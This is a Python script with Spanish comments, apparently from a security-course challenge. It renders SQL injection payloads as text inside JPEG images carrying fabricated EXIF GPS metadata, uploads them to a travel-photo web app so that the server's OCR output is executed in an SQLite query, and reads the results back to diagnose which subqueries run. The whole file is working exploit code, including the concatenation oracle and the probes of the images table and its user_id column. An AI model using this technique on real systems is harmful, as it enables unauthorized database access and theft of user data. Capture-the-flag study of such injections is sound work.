# ocr_exec_diag.py — el OCR lee `... FROM images ...` PERFECTO como literal plano (ver
# ocr_from_diag.py). Entonces el 500 no es reordenamiento del OCR: aparece solo DENTRO del
# envoltorio ejecutable 9'||(...)||'9. Aíslo la causa real subiendo subconsultas ejecutables
# que difieren en un solo factor:
#   - ¿es el FROM en sí, o la tabla images, o el hecho de leer filas?
#   - ¿multiples filas rompen? (subquery escalar con >1 fila)
#   - ¿la coincidencia de tipos / la concatenación?
# summary_ocr guarda el resultado si ejecuta; 500 = SQL roto en ejecución.
import requests, base64, re, os
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-5164f230-2a03-41d3-b9a5-9d2931b34c94-mis-viajes-v2.softwareseguro.com.ar"
PAISAJE = "assets/paisaje.png" if os.path.exists("assets/paisaje.png") else "paisaje.png"
html = requests.get(BASE + "/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open(PAISAJE).convert("RGB")
q = "'"


def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf", "C:/Windows/Fonts/cour.ttf"]:
        try:
            return ImageFont.truetype(p, sz)
        except Exception:
            pass
    return ImageFont.load_default()


def build(text, fname, size=30):
    W = min(2000, max(1000, 40 + int(len(text) * size * 0.56)))
    H = 260
    img = base_img.resize((W, H)); d = ImageDraw.Draw(img); f = font(size)
    bb = d.textbbox((20, 20), text, font=f)
    d.rectangle([0, 0, W, bb[3] + 20], fill=(255, 255, 255))
    d.text((20, 20), text, font=f, fill=(0, 0, 0))
    img.save(fname, "jpeg", quality=72, optimize=True)

    def dms(x):
        dd = int(x); mm = int((x - dd) * 60); s = round((x - dd - mm / 60) * 3600, 4)
        return ((dd, 1), (mm, 1), (int(s * 100), 100))
    ex = {'0th': {piexif.ImageIFD.Make: b'Samsung', piexif.ImageIFD.Model: b'Galaxy S25'},
          'Exif': {piexif.ExifIFD.DateTimeOriginal: b'2025:10:01 23:51:37'},
          'GPS': {piexif.GPSIFD.GPSLatitudeRef: b'S', piexif.GPSIFD.GPSLatitude: dms(41.13),
                  piexif.GPSIFD.GPSLongitudeRef: b'W', piexif.GPSIFD.GPSLongitude: dms(71.31)}}
    piexif.insert(piexif.dump(ex), fname)
    return "data:image/jpeg;base64," + base64.b64encode(open(fname, "rb").read()).decode()


def ex(inner, desc):
    """inner = la subconsulta; se envuelve en el oráculo ejecutable."""
    painted = "9" + q + "||(" + inner + ")||" + q + "9"
    fname = f"ex_{desc}.jpg"
    uri = build(painted, fname)
    r = requests.post(f"{BASE}/upload", json={"image": uri, "description": desc, "user_id": UID})
    ocr = ""
    if r.status_code == 200:
        data = requests.get(f"{BASE}/images/{UID}").json()
        row = next((x for x in data if x.get("description") == desc), None)
        ocr = row.get("summary_ocr", "") if row else ""
    tag = "EXEC-OK" if r.status_code == 200 else "500-BROKE"
    print(f"[{desc:16}] {r.status_code} {tag}  inner={inner!r}")
    if ocr:
        print(f"                  ocr={ocr!r}")
    return r.status_code, ocr


print(f"UID: {UID}\n=== aislar por qué FROM images rompe SOLO dentro del oráculo ===\n")
ex("SELECT sqlite_version()", "base_ok")                    # control: ejecuta
ex("SELECT 1 FROM images LIMIT 1", "const_from")            # ¿FROM images solo (sin columna real)?
ex("SELECT count(*) FROM images", "count_from")             # una fila, agregada
ex("SELECT max(id) FROM images", "maxid")                   # una fila, entero
ex("SELECT user_id FROM images LIMIT 1", "userid_lim")      # una fila, la columna clave
ex("SELECT user_id FROM images WHERE id=2", "userid_id2")   # id propio conocido
ex("SELECT typeof(user_id) FROM images LIMIT 1", "typeof")  # ¿tipo raro?
ex("SELECT hex(user_id) FROM images LIMIT 1", "hex")        # forzar texto puro
